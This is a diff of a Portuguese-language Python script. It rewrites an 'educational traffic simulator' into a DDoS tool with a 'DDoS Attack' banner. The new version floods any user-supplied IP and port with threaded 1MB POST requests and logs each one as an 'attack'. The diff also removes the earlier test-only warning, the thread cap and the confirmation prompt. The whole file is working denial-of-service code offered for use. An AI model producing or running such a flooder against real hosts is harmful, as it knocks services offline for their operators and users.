@@ -1,92 +1,56 @@
-import requests
 import threading
+import socket
+import requests  # Usado para fazer requisições HTTP
 import time
 
-# Função para enviar requisições
-def send_request(url, data, num_threads, delay):
-    def request_task():
-        try:
-            while True:
-                response = requests.post(url, data=data)
-                print(f"Requisição enviada! Status: {response.status_code}")
-                time.sleep(delay)  # Controla a velocidade do envio
-        except Exception as e:
-            print(f"Erro: {e}")
+# Função para exibir a interface com letras bastão
+def exibir_interface():
+    # ASCII art para o nome "DDoS Attack"
+    print("""
+    ███████╗██████╗ ██╗███████╗ ██████╗ ███████╗████████╗
+    ██╔════╝██╔══██╗██║██╔════╝██╔══██╗██╔════╝╚══██╔══╝
+    █████╗  ██████╔╝██║█████╗  ██████╔╝███████╗   ██║
+    ██╔══╝  ██╔══██╗██║██╔══╝  ██╔══██╗╚════██╗  ██║
+    ███████╗██║  ██║██║███████╗██║  ██║███████║  ██║
+    ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝  ╚═╝
+    """)
 
-    # Criar múltiplas threads
-    threads = []
-    for _ in range(num_threads):
-        thread = threading.Thread(target=request_task)
-        threads.append(thread)
-        thread.start()
-
-    # Aguardar todas as threads
-    for thread in threads:
-        thread.join()
-
-# Painel de controle
-def main():
-    print("### Simulador Educacional de Tráfego ###")
-    print("ATENÇÃO: Use este script apenas em ambientes de teste controlados.")
-    
-    # Configuração do alvo
-    ip = input("Digite o IP de destino (ex.: 192.168.0.1): ")
-    port = input("Digite a porta de destino (ex.: 5000): ")
-
+# Função para enviar requisições HTTP com 1MB de dados
+def enviar_requisicao(ip, porta, ataque_numero):
     try:
-        port = int(port)
-        if port < 1 or port > 65535:
-            raise ValueError("Porta inválida!")
-    except ValueError:
-        print("Erro: Porta deve ser um número entre 1 e 65535.")
-        return
+        url = f"http://{ip}:{porta}"  # Monta a URL completa (HTTP)
 
-    url = f"http://{ip}:{port}/data"
-    print(f"\nConfiguração definida: {url}")
+        # Criando um payload de 1MB (1.048.576 bytes) para o ataque
+        payload = "A" * 1048576  # 1MB de dados (exemplo com letra 'A')
+
+        # Envia uma requisição POST com o payload de 1MB de dados
+        resposta = requests.post(url, data=payload, timeout=5)  # Timeout de 5 segundos para a resposta
+        
+        # Checa se a requisição foi bem-sucedida (código 200 é sucesso HTTP)
+        if resposta.status_code == 200:
+            print(f"Ataque {ataque_numero} enviado com sucesso para {ip}:{porta} - Status: {resposta.status_code}")
+        else:
+            print(f"Ataque {ataque_numero} falhou para {ip}:{porta} - Status: {resposta.status_code}")
     
-    # Configuração de dados
-    data_size = int(input("Tamanho dos dados a enviar (em KB): ")) * 1024
-    num_threads = int(input("Número de threads (máximo 500): "))
-    if num_threads > 500:
-        print("Erro: Máximo de 500 threads permitido!")
-        return
+    except requests.exceptions.Timeout:
+        print(f"Ataque {ataque_numero} falhou para {ip}:{porta} - Erro: Timeout")
+    except requests.exceptions.ConnectionError:
+        print(f"Ataque {ataque_numero} falhou para {ip}:{porta} - Erro: Conexão recusada (Connection Refused)")
+    except Exception as e:
+        print(f"Ataque {ataque_numero} falhou para {ip}:{porta} - Erro: {e}")
 
-    # Configuração da velocidade
-    print("\nEscolha a velocidade de execução (1 - Mais lenta, 5 - Mais rápida):")
-    print("1: Muito lenta (2 segundos por requisição)")
-    print("2: Lenta (1 segundo por requisição)")
-    print("3: Moderada (0.5 segundos por requisição)")
-    print("4: Rápida (0.1 segundos por requisição)")
-    print("5: Muito rápida (Sem atraso)")
-    
-    speed_choice = input("Escolha um nível de velocidade (1 a 5): ")
+# Função principal para iniciar o ataque
+def iniciar_ataque(ip, porta, threads):
+    print("Iniciando envio de requisições...")
+    for i in range(1, threads + 1):
+        t = threading.Thread(target=enviar_requisicao, args=(ip, porta, i))
+        t.start()
+        time.sleep(0.1)  # Pequeno atraso entre o envio de cada requisição
 
-    try:
-        speed_choice = int(speed_choice)
-        if speed_choice < 1 or speed_choice > 5:
-            raise ValueError("Escolha inválida!")
-    except ValueError:
-        print("Erro: Escolha deve ser um número entre 1 e 5.")
-        return
+# Exemplo de execução
+exibir_interface()  # Chama a função para exibir a interface com o título
+ip_destino = input("Digite o IP de destino: ")
+porta_destino = int(input("Digite a porta de destino: "))
+num_threads = int(input("Escolha o número de threads (ex.: 10): "))
 
-    # Mapeando a velocidade com base na escolha
-    delay_map = {1: 2.0, 2: 1.0, 3: 0.5, 4: 0.1, 5: 0.0}
-    delay = delay_map[speed_choice]
-
-    # Confirmação
-    print(f"\nConfirmar execução:")
-    print(f"Alvo: {url}")
-    print(f"Tamanho dos dados: {data_size} bytes")
-    print(f"Threads: {num_threads}")
-    print(f"Velocidade: {'Sem atraso' if delay == 0 else f'{delay} segundos entre requisições'}")
-    confirm = input("Deseja iniciar? (s/n): ")
-
-    if confirm.lower() == "s":
-        data = "X" * data_size
-        print("Iniciando envio de requisições...")
-        send_request(url, data, num_threads, delay)
-    else:
-        print("Cancelado.")
-
-if __name__ == "__main__":
-    main()
+iniciar_ataque(ip_destino, porta_destino, num_threads)
